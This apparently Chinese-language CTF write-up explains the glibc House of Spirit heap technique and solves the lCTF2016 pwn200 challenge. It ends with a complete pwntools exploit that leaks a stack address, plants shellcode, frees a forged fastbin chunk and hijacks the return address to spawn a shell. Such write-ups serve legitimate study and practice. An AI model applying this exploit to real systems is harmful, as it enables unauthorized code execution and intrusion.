---
title: House of Spirit
date: '2025-02-21 11:00:53'
updated: '2025-04-07 21:39:55'
---
## 利用点
堆溢出、有栈地址

## 适用范围
2.23——至今

## 原理
利用堆溢出，修改 chunk size，伪造出 fake chunk，然后通过堆的释放和排布，控制 fake chunk。house of spirit 的操作思路有很多，比如可以按如下操作进行利用：

+ 申请 chunk A、chunk B、chunk C、chunk D
+ 对 A 写操作的时候溢出，修改 B 的 size 域，使其能包括 chunk C
+ 释放 B，然后把 B 申请回来，再释放 C，则可以通过读写 B 来控制 C 的内容

## 目的
劫持 fastbin/tcachebin 的 fd 之后，可以任意地址分配、任意地址读写

`fake_fast_chunk` 可以申请并且释放的条件：

1. fake chunk 的 ISMMAP 位不能为 1，因为 free 时，如果是 mmap 的 chunk，会单独处理
2. fake chunk 地址需要对齐， MALLOC_ALIGN_MASK
3. fake chunk 的 size 大小需要满足对应的 fastbin 的需求，同时也得对齐
4. fake chunk 的 next chunk 的大小不能小于 2 * SIZE_SZ，同时也不能大于av->system_mem 
5. fake chunk 对应的 fastbin 链表头部不能是该 fake chunk，即不能构成 double free 的情况

## lCTF2016-pwn200
题目在 BUUCTF 有

跟着 [wp](https://www.cnblogs.com/haidragon/p/17016393.html) 看的，有两种解法，一种是直接改 free 的 got 表改成 shellcode 的地址，另外一种是通过 hos（house of spirit）来控制 rbp 附近的值，从而控制程序流到 shellcode

checksec 看了看：

![](/images/4c9b31e67c1cb75e201cc3be53920d54.png)

什么安全措施都没有

接着看 IDA

![](/images/24db857f48eae25394b653421d178ad5.png)

输入正好 48 个字节的话正好换行符没有被识别到，字符串结尾没有 \x00，后面的 printf 会直接把 rbp 的值给打印出来

![](/images/52d2e715858d6e250e6c8974a151e116.png)

输入的长度正好能把 dest 覆盖，而 dest 又会被赋给全局变量堆指针 ptr

所以这里可以控制到 ptr 的值从而 free 掉一个 fakechunk 进 fastbin 里面

fakechunk 可以在栈上伪造，因为前面能泄露出栈的地址

但是遇到了一件很奇怪的事情

正常来说按照函数调用的栈来说，栈应该是这样的：

![](/images/cdf37d6b0cf0af4ca44d83ebaa2b8150.png)

但是我实际动调发现居然是乱了的...

![](/images/c0e95e2977d988d6c27a2d5a3e45ba3f.png)

输入的 id 是字符串`32`，从截图里面可以看到，id 就在 dest（堆指针）低地址相邻，这对吗？

而且看了看下面的 shellcode 的位置，居然在 realmain 函数返回地址下面...

但是在修改了 ptr 到 fakechunk 的地址之后，能 free 掉，还能正常 malloc 出来修改，成功获得栈上返回地址的控制权

![](/images/0aaa620ef57978842d49aba5bdf7a379.png)

没搞懂的是为什么 id 在这里，动调发现 id 转化成整数之后放在了这里，可以用来伪造下一个 chunk 的 size

输入的 id 是一个字符串，`readandprintf`函数里面还调用了`atoi`函数把 id 转换成整数之后存在 id 栈上相邻的位置

其实 id 的值比较自由，只要符合 fastbin 的 chunk 大小就可以了

这下看明白了，

### 主要思路
先泄露 rbp 的值，得到栈上的地址，在泄露的同时把 shellcode 写到栈上，

然后再利用后面的 id 和读取的 money，构造一个 fakefastchunk 和下一个 chunk 的 size（fakefastchunk 能够控制到 rbp 和 realmain 函数的返回地址）

最后把 fakechunk 释放进 fastbin，再 malloc 申请出来修改返回地址然后选择退出从而执行到 shellcode

完整 exp：

```python
#!/usr/bin/env python3

from pwn import *

context.log_level = 'debug'
context.arch = 'amd64'

link=remote("node5.buuoj.cn",28828)
# link=process("./pwn200")

payload=asm(shellcraft.sh())
payload=payload.ljust(48,b'a')
link.send(payload)
rbp_addr=u64(link.recvuntil('\x7f')[-6:].ljust(8,b'\x00'))
print('realmain_rbp_addr='+hex(rbp_addr))
shellcode_addr=rbp_addr-0x50
print('shellcode_addr='+hex(shellcode_addr))

link.recvuntil(b'id ~~?')
link.sendline(b'48')

# gdb.attach(link,'set solib-search-path ~/FocusingCTF/glibc/2.23-0ubuntu3_amd64/')
# pause()

fakechunk_addr=rbp_addr-0x90
print(hex(fakechunk_addr))
fake_chunk = p64(0)*5
fake_chunk += p64(0x41)
fake_chunk += p64(0)
fake_chunk += p64(fakechunk_addr)

link.recvuntil(b'money~')
link.sendline(fake_chunk)

link.recvuntil(b'your choice : ')
link.sendline(b'2')

link.recvuntil(b'your choice : ')
link.sendline(b'1')
link.recvuntil(b'how long?')
link.sendline(b'48')

payload=b'a'*0x18+p64(shellcode_addr)
link.recvuntil(b'money : ')
link.sendline(payload)

link.recvuntil(b'your choice : ')
link.sendline(b'3')

link.interactive()
```

### 总结
主要就是要在目的内存附近伪造 fakechunk（也可以是堆溢出覆盖到下一个 chunk 的 fd），释放进 bin 里面再申请出来从而获得这一段内存的控制权，可以是 hook 函数、栈上的数据或者函数返回地址...

